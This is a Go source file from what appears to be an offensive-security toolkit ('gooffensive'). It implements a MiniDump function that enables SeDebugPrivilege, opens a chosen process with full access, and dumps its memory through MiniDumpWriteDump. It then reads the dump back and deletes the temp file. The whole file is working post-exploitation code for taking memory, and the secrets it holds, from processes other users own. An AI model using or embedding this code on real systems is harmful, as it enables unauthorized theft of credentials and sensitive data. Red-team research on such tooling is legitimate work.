package gooffensive

import (
	"fmt"
	"io/ioutil"
	"os"
	"syscall"

	offensiveProcess "github.com/gooffensive/gooffensive/pkg/gooffensive/process"
	offensiveToken "github.com/gooffensive/gooffensive/pkg/gooffensive/token"
	"golang.org/x/sys/windows"
)

//MiniDump performs a 'minidumpwritedump' operation on the provided process.
//Uses GetProcess to identify the process - providing both a process name and a PID will result in the PID being used.
func MiniDump(tempDir string, process string, inPid uint32) (procName string, pid uint32, dumpContent []byte, err error) {
	//much the same as the function used in Merlin (https://github.com/Ne0nd0g/merlin/blob/master/pkg/agent/exec_windows.go)

	// Make sure temporary directory exists before executing miniDump functionality
	if tempDir != "" {
		d, errS := os.Stat(tempDir)
		if os.IsNotExist(errS) {
			return procName, pid, []byte{}, fmt.Errorf("the provided directory does not exist: %s", tempDir)
		}
		if d.IsDir() != true {
			return procName, pid, []byte{}, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
		}
	} else {
		tempDir = os.TempDir()
	}

	// Get the process PID or name
	procName, pid, err = offensiveProcess.GetProcess(process, inPid)
	if err != nil {
		return
	}

	// Get debug privs (required for dumping processes not owned by current user)
	err = offensiveToken.SePrivEnable("SeDebugPrivilege")
	if err != nil {
		return
	}

	// Get a handle to process
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, pid) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	if err != nil {
		return
	}

	// Set up the temporary file to write to, automatically remove it once done
	// TODO: Work out how to do this in memory
	f, err := ioutil.TempFile(tempDir, "*.tmp")
	if err != nil {
		return
	}

	// Remove the file after the function exits, regardless of error nor not
	defer os.Remove(f.Name())

	// Load MiniDumpWriteDump function from DbgHelp.dll
	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
	miniDump := k32.NewProc("MiniDumpWriteDump")

	/*
		BOOL MiniDumpWriteDump(
		  HANDLE                            hProcess,
		  DWORD                             ProcessId,
		  HANDLE                            hFile,
		  MINIDUMP_TYPE                     DumpType,
		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
		);
	*/
	// Call Windows MiniDumpWriteDump API
	r, _, lErr := miniDump.Call(uintptr(hProc), uintptr(pid), f.Fd(), 3, 0, 0, 0)

	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does

	if r != 0 {
		dumpContent, err = ioutil.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return
		}
	} else {
		err = lErr
	}
	return
}
